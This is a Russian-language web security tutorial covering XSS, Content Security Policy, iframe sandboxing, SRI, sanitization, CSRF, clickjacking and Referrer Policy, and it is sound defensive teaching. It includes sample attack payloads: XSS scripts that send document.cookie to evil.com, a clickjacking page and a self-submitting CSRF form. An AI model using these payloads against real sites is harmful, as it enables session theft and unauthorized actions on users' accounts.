## 1. XSS — Cross-Site Scripting

### 1.1. Что такое XSS

**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, просматриваемую другими пользователями. XSS стабильно входит в OWASP Top 10 и остаётся одной из самых распространённых уязвимостей.

Последствия XSS:
- Кража cookies и session tokens
- Перенаправление на фишинговые сайты
- Кейлоггинг (перехват нажатий клавиш)
- Изменение содержимого страницы (defacement)
- Выполнение действий от имени пользователя

### 1.2. Типы XSS

| Тип | Описание | Вектор |
|-----|----------|--------|
| **Stored (Persistent)** | Вредоносный код сохраняется на сервере (БД, файлы) | Комментарии, профили, сообщения |
| **Reflected** | Код отражается от сервера через URL-параметры | Поисковые запросы, URL-параметры, error messages |
| **DOM-based** | Код выполняется полностью на клиенте, сервер не участвует | `location.hash`, `document.URL`, `innerHTML` |

### 1.3. Stored XSS — пример

```html
<!-- Злоумышленник отправляет комментарий: -->
<script>
  // Код сохраняется в БД
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<!-- Когда другой пользователь загружает страницу с комментариями,
     браузер выполняет этот скрипт -->

<!-- ❌ Уязвимый серверный код (псевдокод): -->
<!-- response.write('<div>' + comment.text + '</div>') -->

<!-- ✅ Безопасный серверный код: -->
<!-- response.write('<div>' + escapeHtml(comment.text) + '</div>') -->
```

### 1.4. Reflected XSS — пример

```
# Злоумышленник отправляет ссылку:
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

```html
<!-- ❌ Уязвимая страница результатов поиска: -->
<p>Результаты для: <?= $_GET['q'] ?></p>

<!-- ✅ Безопасная версия: -->
<p>Результаты для: <?= htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8') ?></p>
```

### 1.5. DOM-based XSS — пример

```javascript
// ❌ Уязвимый код:
const searchTerm = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = 'Поиск: ' + searchTerm;
// URL: ?q=<img src=x onerror=alert(document.cookie)>

// ✅ Безопасная версия:
document.getElementById('results').textContent = 'Поиск: ' + searchTerm;
// textContent экранирует HTML автоматически
```

### 1.6. Dangerous Sinks (опасные точки внедрения)

| Sink (приёмник) | Опасность | Безопасная альтернатива |
|-----------------|-----------|----------------------|
| `element.innerHTML` | Парсит HTML, выполняет скрипты через event handlers | `element.textContent` |
| `document.write()` | Полностью перезаписывает документ | Не использовать |
| `eval()` | Выполняет произвольный код | `JSON.parse()` для данных |
| `setTimeout(string)` | Выполняет строку как код | `setTimeout(function)` |
| `location.href = userInput` | Open redirect | Валидация URL |
| `element.setAttribute('onclick', userInput)` | Выполнение кода | `addEventListener()` |
| `jQuery.html()` | Аналогично innerHTML | `jQuery.text()` |
| `element.insertAdjacentHTML()` | Парсит HTML | Используйте с осторожностью |

### 1.7. HTML Encoding — экранирование

```javascript
// Минимальный набор символов для экранирования в HTML-контексте
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// Для атрибутов — дополнительное экранирование
function escapeAttribute(str) {
  return str.replace(/[&<>"'`=\/]/g, char =>
    '&#' + char.charCodeAt(0) + ';'
  );
}
```

> **Критическое правило:** Контекст определяет способ экранирования. HTML encoding не защитит в JavaScript-контексте, URL-контексте или CSS-контексте. Каждый контекст требует свой тип экранирования.

| Контекст | Пример | Тип экранирования |
|----------|--------|-------------------|
| HTML body | `<div>USER_DATA</div>` | HTML entity encoding |
| HTML attribute | `<input value="USER_DATA">` | HTML attribute encoding |
| JavaScript | `<script>var x = 'USER_DATA'</script>` | JavaScript encoding |
| URL parameter | `<a href="/page?q=USER_DATA">` | URL encoding |
| CSS | `<div style="color: USER_DATA">` | CSS encoding |

## 2. Content Security Policy (CSP)

### 2.1. Что такое CSP

**Content Security Policy** — HTTP-заголовок (или meta-тег), определяющий, какие ресурсы разрешено загружать и выполнять на странице. CSP — один из самых эффективных механизмов защиты от XSS.

### 2.2. Способы установки CSP

```html
<!-- Вариант 1: HTTP-заголовок (рекомендуется) -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' -->

<!-- Вариант 2: meta-тег (ограниченный набор директив) -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://cdn.example.com">

<!-- Вариант 3: Report-Only (для тестирования, только HTTP-заголовок) -->
<!-- Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report -->
```

### 2.3. Директивы CSP

| Директива | Описание | Контролирует |
|-----------|----------|-------------|
| `default-src` | Fallback для всех не указанных директив | Все типы ресурсов |
| `script-src` | Источники JavaScript | `<script>`, inline scripts, `eval()` |
| `style-src` | Источники CSS | `<link>`, `<style>`, inline styles |
| `img-src` | Источники изображений | `<img>`, `background-image`, favicon |
| `font-src` | Источники шрифтов | `@font-face` |
| `connect-src` | Источники для сетевых запросов | `fetch()`, `XMLHttpRequest`, WebSocket |
| `media-src` | Источники медиа | `<audio>`, `<video>` |
| `object-src` | Источники плагинов | `<object>`, `<embed>` |
| `frame-src` | Источники для iframe | `<iframe>` |
| `child-src` | Источники для worker-ов и iframe | Web Workers, `<iframe>` |
| `worker-src` | Источники для Web Workers | `new Worker()`, `SharedWorker` |
| `frame-ancestors` | Кто может встраивать страницу | Защита от clickjacking |
| `form-action` | Куда можно отправлять формы | `<form action="...">` |
| `base-uri` | Ограничение `<base>` | `<base href="...">` |
| `report-uri` / `report-to` | Куда отправлять отчёты о нарушениях | CSP Reporting |

### 2.4. Значения источников

| Значение | Описание |
|----------|----------|
| `'self'` | Тот же origin (протокол + хост + порт) |
| `'none'` | Ничего не разрешено |
| `'unsafe-inline'` | Разрешить inline-скрипты/стили (снижает защиту!) |
| `'unsafe-eval'` | Разрешить `eval()` и подобные (снижает защиту!) |
| `'nonce-{random}'` | Разрешить конкретный inline-блок с совпадающим nonce |
| `'sha256-{hash}'` | Разрешить inline-блок с совпадающим хешем |
| `'strict-dynamic'` | Доверенные скрипты могут загружать другие скрипты |
| `https:` | Любой HTTPS-источник |
| `data:` | Data URI (`data:image/png;base64,...`) |
| `blob:` | Blob URI |
| `*.example.com` | Wildcard для поддоменов |

### 2.5. Nonce-based CSP

```html
<!-- Сервер генерирует случайный nonce для каждого запроса -->
<!-- HTTP-заголовок: Content-Security-Policy: script-src 'nonce-abc123def456' -->

<!-- Только скрипты с совпадающим nonce выполняются -->
<script nonce="abc123def456">
  // ✅ Этот скрипт выполнится
  console.log('Trusted script');
</script>

<script nonce="abc123def456" src="/js/app.js"></script> <!-- ✅ -->

<script>
  // ❌ Этот скрипт заблокирован (нет nonce)
  alert('Malicious!');
</script>

<!-- ❌ XSS-инъекция не может угадать nonce -->
<script>stealCookies()</script>
```

> **Критически важно:** Nonce должен быть криптографически случайным и уникальным для каждого HTTP-ответа. Никогда не используйте предсказуемые nonce (timestamp, sequence number).

### 2.6. Hash-based CSP

```html
<!-- Content-Security-Policy: script-src 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc=' -->

<!-- Хеш вычисляется от содержимого скрипта -->
<script>
  console.log('Known inline script');
</script>

<!-- Вычисление хеша: echo -n "console.log('Known inline script');" | openssl dgst -sha256 -binary | openssl base64 -->
```

### 2.7. strict-dynamic

```
Content-Security-Policy: script-src 'nonce-random123' 'strict-dynamic'
```

`strict-dynamic` позволяет доверенным скриптам (с nonce) динамически загружать другие скрипты без указания их origin в CSP:

```html
<script nonce="random123">
  // ✅ Этот скрипт доверен (имеет nonce)

  // Динамически загруженный скрипт тоже будет доверен
  const script = document.createElement('script');
  script.src = 'https://any-cdn.com/library.js';
  document.head.appendChild(script); // ✅ Разрешено strict-dynamic
</script>
```

### 2.8. Примеры CSP для разных сценариев

```
# Строгий CSP (рекомендуемый минимум)
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';

# CSP для SPA с CDN
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;

# CSP для статического сайта
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
```

### 2.9. CSP Reporting

```
Content-Security-Policy:
  default-src 'self';
  report-to csp-endpoint;

# HTTP-заголовок Reporting-Endpoints
Reporting-Endpoints: csp-endpoint="https://example.com/csp-reports"
```

```json
// Пример отчёта о нарушении CSP
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "original-policy": "default-src 'self'; script-src 'self'",
    "disposition": "enforce",
    "effective-directive": "script-src",
    "status-code": 200,
    "source-file": "https://example.com/page",
    "line-number": 42
  }
}
```

## 3. Iframe Security — безопасность iframe

### 3.1. Атрибут sandbox

`sandbox` — мощный механизм ограничения возможностей содержимого iframe:

```html
<!-- Максимально ограниченный iframe (всё запрещено) -->
<iframe src="untrusted.html" sandbox></iframe>

<!-- Выборочное разрешение возможностей -->
<iframe src="widget.html"
  sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
</iframe>
```

### 3.2. Значения sandbox

| Значение | Описание | Без него |
|----------|----------|----------|
| (пустой sandbox) | Все ограничения включены | — |
| `allow-scripts` | Разрешить выполнение скриптов | Скрипты заблокированы |
| `allow-same-origin` | Разрешить same-origin доступ | Уникальный origin (opaque) |
| `allow-forms` | Разрешить отправку форм | Формы заблокированы |
| `allow-popups` | Разрешить `window.open()`, `target="_blank"` | Попапы заблокированы |
| `allow-popups-to-escape-sandbox` | Попапы не наследуют sandbox | Попапы тоже в sandbox |
| `allow-top-navigation` | Разрешить навигацию top-level окна | Навигация заблокирована |
| `allow-top-navigation-by-user-activation` | Навигация top-level только по действию пользователя | — |
| `allow-modals` | Разрешить `alert()`, `confirm()`, `prompt()` | Модалы заблокированы |
| `allow-downloads` | Разрешить загрузку файлов | Загрузки заблокированы |
| `allow-presentation` | Разрешить Presentation API | — |
| `allow-orientation-lock` | Разрешить блокировку ориентации | — |
| `allow-storage-access-by-user-activation` | Разрешить Storage Access API | — |

> **Опасная комбинация:** `allow-scripts` + `allow-same-origin` вместе позволяют содержимому iframe удалить собственный sandbox! Используйте эту комбинацию только для доверенного контента.

### 3.3. Атрибут allow (Permissions Policy)

```html
<!-- Управление Permissions Policy для iframe -->
<iframe src="video-player.html"
  allow="camera; microphone; fullscreen; autoplay; picture-in-picture"
  sandbox="allow-scripts allow-same-origin">
</iframe>

<!-- Ограничение геолокации -->
<iframe src="map.html"
  allow="geolocation 'self' https://maps.example.com">
</iframe>

<!-- Запрет определённых API -->
<iframe src="widget.html"
  allow="camera 'none'; microphone 'none'; payment 'none'">
</iframe>
```

### 3.4. X-Frame-Options vs frame-ancestors

```
# Устаревший заголовок (но всё ещё поддерживается)
X-Frame-Options: DENY                    # Запретить встраивание
X-Frame-Options: SAMEORIGIN              # Только с того же origin
X-Frame-Options: ALLOW-FROM https://...  # Устарело, не поддерживается в Chrome

# Современная альтернатива — CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none';             # Запретить
Content-Security-Policy: frame-ancestors 'self';             # Только свой origin
Content-Security-Policy: frame-ancestors https://trusted.com; # Конкретные origins
```

| Аспект | X-Frame-Options | CSP frame-ancestors |
|--------|----------------|-------------------|
| Множественные origins | Нет (только один) | Да (через пробел) |
| Wildcards | Нет | Да (`*.example.com`) |
| meta-тег | Нет | Нет (только HTTP-заголовок) |
| Приоритет | Ниже | Выше (если оба присутствуют) |
| Рекомендация | Legacy | Рекомендуемый подход |

## 4. CORS и HTML — crossorigin и integrity

### 4.1. Атрибут crossorigin

```html
<!-- Без crossorigin: запрос отправляется без credentials, ошибки скрыты -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- crossorigin="anonymous": CORS-запрос без cookies -->
<script src="https://cdn.example.com/lib.js" crossorigin="anonymous"></script>
<!-- Сервер должен вернуть: Access-Control-Allow-Origin: * -->
<!-- Преимущество: полные stack traces в window.onerror -->

<!-- crossorigin="use-credentials": CORS-запрос с cookies -->
<script src="https://cdn.example.com/lib.js" crossorigin="use-credentials"></script>
<!-- Сервер должен вернуть:
     Access-Control-Allow-Origin: https://example.com (НЕ *)
     Access-Control-Allow-Credentials: true -->
```

### 4.2. Элементы с поддержкой crossorigin

| Элемент | Зачем нужен crossorigin |
|---------|------------------------|
| `<script>` | Полные stack traces, SRI |
| `<link>` | CORS для стилей, preload, SRI |
| `<img>` | Использование в canvas (tainted canvas prevention) |
| `<audio>` / `<video>` | Доступ к данным через Web Audio API / Canvas |
| `<source>` (внутри video/audio) | Наследует от родительского media-элемента |

```html
<!-- Изображение для canvas: без crossorigin canvas станет "tainted" -->
<img src="https://cdn.example.com/photo.jpg" crossorigin="anonymous">

<script>
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.drawImage(img, 0, 0);

  // Без crossorigin: SecurityError при вызове toDataURL()
  // С crossorigin: работает нормально
  const dataUrl = canvas.toDataURL();
</script>

<!-- Preconnect с crossorigin для шрифтов (обязательно!) -->
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
```

> **Частая ошибка:** Забытый `crossorigin` на `<link rel="preconnect">` для шрифтов. Без него браузер установит соединение без CORS, а при загрузке шрифта (который требует CORS) установит ВТОРОЕ соединение — preconnect не даст эффекта.

## 5. Subresource Integrity (SRI)

### 5.1. Что такое SRI

**Subresource Integrity** — механизм, позволяющий браузеру проверять, что загруженный ресурс не был изменён. Браузер сравнивает хеш загруженного файла с хешем в атрибуте `integrity`.

### 5.2. Синтаксис

```html
<!-- SRI для скриптов -->
<script
  src="https://cdn.example.com/framework.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous">
</script>

<!-- SRI для стилей -->
<link
  rel="stylesheet"
  href="https://cdn.example.com/styles.min.css"
  integrity="sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc="
  crossorigin="anonymous">

<!-- Несколько хешей (fallback для разных алгоритмов) -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha256-abc123... sha384-def456... sha512-ghi789..."
  crossorigin="anonymous">
</script>
<!-- Браузер выберет самый сильный алгоритм -->
```

### 5.3. Алгоритмы хеширования

| Алгоритм | Описание | Рекомендация |
|----------|----------|-------------|
| `sha256` | SHA-256 (256 бит) | Минимально допустимый |
| `sha384` | SHA-384 (384 бита) | Рекомендуемый |
| `sha512` | SHA-512 (512 бит) | Максимальная защита |

### 5.4. Генерация SRI-хеша

```bash
# В командной строке
cat framework.min.js | openssl dgst -sha384 -binary | openssl base64 -A
# Результат: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w

# С помощью shasum
shasum -b -a 384 framework.min.js | awk '{ print $1 }' | xxd -r -p | base64

# Онлайн-генераторы: srihash.org
```

### 5.5. Поведение при несовпадении хеша

```html
<!-- Если хеш не совпадает: -->
<script
  src="https://cdn.example.com/compromised.js"
  integrity="sha384-expectedHash..."
  crossorigin="anonymous">
</script>
<!-- Браузер: НЕ выполнит скрипт, покажет ошибку в консоли -->
<!-- Network error: SRI check failed -->
```

> **Важно:** SRI требует `crossorigin` для кросс-доменных ресурсов. Без `crossorigin` браузер не может прочитать содержимое ответа для вычисления хеша — SRI-проверка не выполнится.

### 5.6. Ограничения SRI

- Работает только для `<script>` и `<link rel="stylesheet">`
- Не работает для динамически добавленных скриптов (без workaround)
- Не защищает от подмены на уровне DNS или TLS
- Требует обновления хешей при каждом обновлении ресурса
- Может сломать сайт при обновлении CDN-ресурса без обновления хеша

## 6. Sanitization — очистка данных

### 6.1. Проблема пользовательского HTML

Некоторые приложения должны принимать HTML от пользователей (WYSIWYG-редакторы, markdown, rich text). Прямая вставка такого HTML через `innerHTML` — XSS-уязвимость.

### 6.2. DOMPurify — библиотека очистки

```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
<script>
  const dirty = '<p>Текст</p><script>alert("XSS")<\/script><img src=x onerror=alert(1)>';

  // Очистка — удаляет опасные элементы и атрибуты
  const clean = DOMPurify.sanitize(dirty);
  // Результат: '<p>Текст</p><img src="x">'

  document.getElementById('content').innerHTML = clean; // ✅ Безопасно

  // Конфигурация
  const config = {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOW_DATA_ATTR: false,
    ADD_TAGS: ['custom-tag'],
    FORBID_TAGS: ['style', 'script'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload'],
  };

  const strictClean = DOMPurify.sanitize(dirty, config);

  // Хуки для кастомной обработки
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    // Добавить rel="noopener noreferrer" ко всем ссылкам
    if (node.tagName === 'A') {
      node.setAttribute('rel', 'noopener noreferrer');
      node.setAttribute('target', '_blank');
    }
  });
</script>
```

### 6.3. Sanitizer API (Web Platform)

```javascript
// Sanitizer API — нативный браузерный API (стандартизируется)
// Статус: в разработке, Chrome имеет экспериментальную поддержку

const sanitizer = new Sanitizer({
  allowElements: ['p', 'b', 'i', 'em', 'strong', 'a', 'br'],
  allowAttributes: {
    'href': ['a'],
    'title': ['*']
  },
  dropElements: ['script', 'style'],
  dropAttributes: {
    'onclick': ['*'],
    'onerror': ['*']
  }
});

// Метод setHTML (безопасная замена innerHTML)
element.setHTML(untrustedHTML, { sanitizer });

// Или через Sanitizer.sanitize()
const cleanDocFragment = sanitizer.sanitize(untrustedHTML);
element.replaceChildren(cleanDocFragment);
```

### 6.4. Trusted Types — защита sink-ов

```html
<!-- CSP-заголовок для включения Trusted Types -->
<!-- Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy -->

<script>
  // Создание политики
  const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => {
      // Санитизация при каждом присвоении innerHTML
      return DOMPurify.sanitize(input);
    },
    createScriptURL: (input) => {
      // Валидация URL скриптов
      const url = new URL(input, location.origin);
      if (url.origin === location.origin) return url.href;
      throw new TypeError('Untrusted script URL: ' + input);
    },
    createScript: (input) => {
      throw new TypeError('Script creation blocked');
    }
  });

  // ✅ Использование через политику
  element.innerHTML = policy.createHTML(userContent);

  // ❌ Прямое присвоение — TypeError (Trusted Types enforced)
  element.innerHTML = userContent; // TypeError!

  // Проверка поддержки
  if (window.trustedTypes) {
    console.log('Trusted Types поддерживаются');
  }
</script>
```

> **Trusted Types** — это наиболее надёжный механизм предотвращения DOM XSS. Он перехватывает все dangerous sinks (`innerHTML`, `document.write()`, `eval()`, `script.src`) и требует прохождения через политику санитизации.

## 7. Атрибут rel — noopener, noreferrer, nofollow

### 7.1. rel="noopener"

```html
<!-- Проблема: target="_blank" без noopener даёт целевой странице доступ к window.opener -->
<!-- ❌ Опасно (в старых браузерах): -->
<a href="https://external.com" target="_blank">Внешний сайт</a>
<!-- external.com может выполнить: window.opener.location = 'https://phishing.com' -->

<!-- ✅ Безопасно: -->
<a href="https://external.com" target="_blank" rel="noopener">Внешний сайт</a>
<!-- window.opener === null на целевой странице -->
```

> **Современные браузеры:** Chrome 88+, Firefox 79+, Safari 12.1+ автоматически подразумевают `noopener` для `target="_blank"`. Но для обратной совместимости и явности рекомендуется указывать `rel="noopener"`.

### 7.2. rel="noreferrer"

```html
<!-- noreferrer: не отправлять Referer заголовок + подразумевает noopener -->
<a href="https://external.com" target="_blank" rel="noreferrer">
  Без реферера
</a>
<!-- Целевой сайт НЕ узнает, откуда пришёл пользователь -->
<!-- + window.opener === null -->
```

### 7.3. rel="nofollow"

```html
<!-- nofollow: указание поисковикам не передавать "ссылочный вес" -->
<a href="https://user-content.com" rel="nofollow">Ссылка из комментария</a>

<!-- Дополнительные значения для Google: -->
<a href="https://sponsor.com" rel="sponsored">Рекламная ссылка</a>
<a href="https://user-blog.com" rel="ugc">Пользовательский контент</a>
```

| Значение | Описание | Когда использовать |
|----------|----------|--------------------|
| `noopener` | Блокирует доступ к `window.opener` | Все внешние `target="_blank"` ссылки |
| `noreferrer` | Не отправляет Referer + включает noopener | Конфиденциальные ссылки |
| `nofollow` | Не передавать SEO-вес | Непроверенные ссылки, комментарии |
| `sponsored` | Рекламная/оплаченная ссылка (Google) | Спонсорские ссылки |
| `ugc` | User Generated Content (Google) | Комментарии, форумы |

### 7.4. Комбинирование значений

```html
<!-- Для внешних ссылок в комментариях — максимальная защита -->
<a href="https://user-link.com"
   target="_blank"
   rel="noopener noreferrer nofollow ugc">
  Ссылка из комментария
</a>
```

## 8. Clickjacking Prevention — защита от кликджекинга

### 8.1. Что такое Clickjacking

**Clickjacking** (UI Redressing) — атака, при которой прозрачный iframe с целевым сайтом размещается поверх визуально привлекательного контента. Пользователь думает, что кликает на видимую кнопку, но на самом деле взаимодействует со скрытым iframe.

```html
<!-- Сайт злоумышленника -->
<style>
  .hidden-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;           /* Полностью прозрачный */
    z-index: 1000;
  }
  .bait-button {
    position: absolute;
    top: 200px;
    left: 300px;
  }
</style>

<!-- Прозрачный iframe с целевым сайтом -->
<iframe src="https://bank.com/transfer?to=attacker&amount=10000"
        class="hidden-frame"></iframe>

<!-- Видимая приманка -->
<button class="bait-button">Получить приз!</button>
```

### 8.2. Защита через frame-ancestors (CSP)

```
# Запретить встраивание во фреймы
Content-Security-Policy: frame-ancestors 'none';

# Разрешить только с того же origin
Content-Security-Policy: frame-ancestors 'self';

# Разрешить конкретные домены
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;
```

### 8.3. Защита через X-Frame-Options

```
# Полный запрет
X-Frame-Options: DENY

# Только с того же origin
X-Frame-Options: SAMEORIGIN
```

### 8.4. JavaScript Frame Busting (дополнительная защита)

```html
<style>
  /* Скрыть контент, пока не убедимся, что мы не во фрейме */
  body { display: none !important; }
</style>

<script>
  if (self === top) {
    // Мы не во фрейме — показать контент
    document.body.style.display = 'block';
  } else {
    // Мы во фрейме — попытаться выйти
    top.location = self.location;
  }
</script>
```

> **Важно:** JavaScript frame busting — ненадёжный метод. sandbox iframe может заблокировать навигацию. Используйте CSP `frame-ancestors` как основной механизм, а JS — как дополнительный слой.

## 9. Form Security — безопасность форм

### 9.1. CSRF — Cross-Site Request Forgery

**CSRF** — атака, вынуждающая браузер авторизованного пользователя отправить нежелательный запрос:

```html
<!-- Сайт злоумышленника -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById('csrf-form').submit();
  // Браузер отправит запрос с cookies пользователя банка!
</script>
```

### 9.2. Защита от CSRF

```html
<!-- Метод 1: CSRF-токен в форме -->
<form action="/transfer" method="POST">
  <!-- Токен генерируется сервером, уникален для каждой сессии -->
  <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
  <input type="text" name="to" placeholder="Получатель">
  <input type="number" name="amount" placeholder="Сумма">
  <button type="submit">Перевести</button>
</form>

<!-- Метод 2: SameSite cookies (серверная настройка) -->
<!-- Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly -->
<!-- SameSite=Strict: cookie не отправляется при кросс-доменных запросах -->
<!-- SameSite=Lax: cookie отправляется только при top-level навигации (GET) -->

<!-- Метод 3: Double Submit Cookie -->
<!-- Cookie + скрытое поле в форме с одинаковым значением -->
```

### 9.3. Autocomplete для чувствительных полей

```html
<form action="/login" method="POST">
  <!-- Разрешить автозаполнение для login -->
  <label for="username">Логин</label>
  <input type="text" id="username" name="username" autocomplete="username">

  <label for="password">Пароль</label>
  <input type="password" id="password" name="password" autocomplete="current-password">

  <!-- Для одноразовых кодов -->
  <label for="otp">Код подтверждения</label>
  <input type="text" id="otp" name="otp"
         autocomplete="one-time-code"
         inputmode="numeric"
         pattern="[0-9]{6}">

  <!-- ❌ Отключение автозаполнения для чувствительных полей -->
  <!-- (браузеры могут игнорировать autocomplete="off") -->
  <label for="ssn">ИНН</label>
  <input type="text" id="ssn" name="ssn" autocomplete="off">

  <button type="submit">Войти</button>
</form>
```

### 9.4. Атрибут action и formaction

```html
<!-- ⚠️ Атрибут formaction на кнопке может переопределить action формы -->
<form action="/safe-endpoint" method="POST">
  <input type="text" name="data">

  <!-- Этот submit отправит на /safe-endpoint -->
  <button type="submit">Отправить</button>

  <!-- ❌ Если злоумышленник может инъецировать HTML: -->
  <!-- <button type="submit" formaction="https://evil.com/steal">Отправить</button> -->
  <!-- Данные уйдут на evil.com! -->
</form>

<!-- Защита через CSP: -->
<!-- Content-Security-Policy: form-action 'self' -->
```

### 9.5. Защита от спама в формах

```html
<!-- Honeypot — скрытое поле-ловушка для ботов -->
<form action="/submit" method="POST">
  <!-- Визуально скрыто, но боты заполнят -->
  <div style="position: absolute; left: -9999px;" aria-hidden="true">
    <label for="website">Website (do not fill)</label>
    <input type="text" id="website" name="website" tabindex="-1" autocomplete="off">
  </div>

  <label for="email">Email</label>
  <input type="email" id="email" name="email" required>

  <label for="message">Сообщение</label>
  <textarea id="message" name="message" required></textarea>

  <button type="submit">Отправить</button>
</form>

<script>
  // Серверная проверка: если поле "website" заполнено — это бот
</script>
```

## 10. Referrer Policy — управление реферером

### 10.1. Что такое Referer

HTTP-заголовок `Referer` (ошибка в написании стала стандартом) сообщает целевому серверу URL страницы, с которой пришёл запрос. Это может раскрывать конфиденциальную информацию.

```
# Пользователь переходит с https://example.com/secret/document?token=abc123
# на https://external.com

# Без Referrer-Policy:
Referer: https://example.com/secret/document?token=abc123
# Внешний сайт видит полный URL включая path и query string!
```

### 10.2. Установка Referrer Policy

```html
<!-- Вариант 1: meta-тег для всей страницы -->
<meta name="referrer" content="strict-origin-when-cross-origin">

<!-- Вариант 2: атрибут на конкретном элементе -->
<a href="https://external.com" referrerpolicy="no-referrer">Внешняя ссылка</a>
<img src="https://tracking.com/pixel.gif" referrerpolicy="no-referrer">
<script src="https://cdn.com/script.js" referrerpolicy="no-referrer"></script>

<!-- Вариант 3: HTTP-заголовок -->
<!-- Referrer-Policy: strict-origin-when-cross-origin -->
```

### 10.3. Значения Referrer Policy

| Значение | Same-origin | Cross-origin (HTTPS→HTTPS) | Downgrade (HTTPS→HTTP) |
|----------|-------------|---------------------------|----------------------|
| `no-referrer` | Ничего | Ничего | Ничего |
| `no-referrer-when-downgrade` | Полный URL | Полный URL | Ничего |
| `origin` | Origin | Origin | Origin |
| `origin-when-cross-origin` | Полный URL | Origin | Origin |
| `same-origin` | Полный URL | Ничего | Ничего |
| `strict-origin` | Origin | Origin | Ничего |
| `strict-origin-when-cross-origin` | Полный URL | Origin | Ничего |
| `unsafe-url` | Полный URL | Полный URL | Полный URL |

**Где:**
- **Полный URL** = `https://example.com/path/page?query=value`
- **Origin** = `https://example.com`
- **Ничего** = заголовок Referer не отправляется

### 10.4. Рекомендуемая политика

```html
<!-- Рекомендуемая по умолчанию (и является default в современных браузерах) -->
<meta name="referrer" content="strict-origin-when-cross-origin">

<!--
  Same-origin: отправляет полный URL (нормально)
  Cross-origin HTTPS→HTTPS: отправляет только origin (безопасно)
  Downgrade HTTPS→HTTP: не отправляет ничего (безопасно)
-->
```

### 10.5. Чек-лист безопасности HTML

```
□ CSP настроен (минимум script-src, object-src 'none')
□ frame-ancestors настроен (защита от clickjacking)
□ X-Content-Type-Options: nosniff
□ Referrer-Policy: strict-origin-when-cross-origin
□ Все внешние target="_blank" ссылки имеют rel="noopener"
□ SRI для внешних скриптов и стилей (CDN)
□ CSRF-токены в формах
□ Пользовательский HTML санитизируется (DOMPurify / Sanitizer API)
□ Нет innerHTML с пользовательскими данными
□ autocomplete="off" для чувствительных полей
□ HTTPS everywhere
□ Cookies: SameSite=Lax/Strict; Secure; HttpOnly
□ Trusted Types включены (CSP require-trusted-types-for)
□ form-action ограничен в CSP
□ base-uri ограничен в CSP
```
